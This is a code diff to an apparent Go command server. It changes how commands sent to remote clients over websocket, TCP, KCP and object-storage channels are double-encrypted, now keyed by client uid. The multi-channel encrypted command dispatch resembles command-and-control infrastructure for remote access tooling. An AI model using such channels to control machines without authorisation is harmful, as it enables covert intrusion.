@@ -140,8 +140,8 @@ func SendCommand(uid string, command string) {
 	case "web":
 		command1.CommandQueues.AddCommand(uid, byteToSend)
 	case "websocket":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, _ := encrypt.Encrypt(byteToSend, uid)
+		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		ws.SendToClient(uid, cmdBase64)
 		//client := ws.ClientManager[uid]
@@ -150,8 +150,8 @@ func SendCommand(uid string, command string) {
 		//client.WriteMu.Unlock()
 		//ws.ClientManager[uid].WriteMessage(websocket.BinaryMessage, cmdBase64)
 	case "tcp":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, _ := encrypt.Encrypt(byteToSend, uid)
+		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
@@ -165,8 +165,8 @@ func SendCommand(uid string, command string) {
 		//writer.Write(msgToSend)
 		//writer.Flush()
 	case "kcp":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, _ := encrypt.Encrypt(byteToSend, uid)
+		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
@@ -177,8 +177,8 @@ func SendCommand(uid string, command string) {
 		//client.Session.Write(msgToSend)
 		//client.WriteMu.Unlock()
 	case "oss":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, _ := encrypt.Encrypt(byteToSend, uid)
+		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		oss.Send(oss.Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
 	}
@@ -189,8 +189,8 @@ func SendCommandBytes(uid string, byteToSend []byte) {
 	case "web":
 		command1.CommandQueues.AddCommand(uid, byteToSend)
 	case "websocket":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, _ := encrypt.Encrypt(byteToSend, uid)
+		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		ws.SendToClient(uid, cmdBase64)
 		//client := ws.ClientManager[uid]
@@ -198,8 +198,8 @@ func SendCommandBytes(uid string, byteToSend []byte) {
 		//client.Conn.WriteMessage(websocket.BinaryMessage, cmdBase64)
 		//client.WriteMu.Unlock()
 	case "tcp":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, _ := encrypt.Encrypt(byteToSend, uid)
+		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
@@ -213,8 +213,8 @@ func SendCommandBytes(uid string, byteToSend []byte) {
 		//writer.Write(msgToSend)
 		//writer.Flush()
 	case "kcp":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, _ := encrypt.Encrypt(byteToSend, uid)
+		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		cmdLen := len(cmdBase64)
 		cmdLenBytes := utils.WriteInt(cmdLen)
@@ -225,8 +225,8 @@ func SendCommandBytes(uid string, byteToSend []byte) {
 		//client.Session.Write(msgToSend)
 		//client.WriteMu.Unlock()
 	case "oss":
-		cmdBytes, _ := encrypt.Encrypt(byteToSend)
-		cmdBytes, _ = encrypt.Encrypt(cmdBytes)
+		cmdBytes, _ := encrypt.Encrypt(byteToSend, uid)
+		cmdBytes, _ = encrypt.Encrypt(cmdBytes, uid)
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
 		oss.Send(oss.Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
 	}
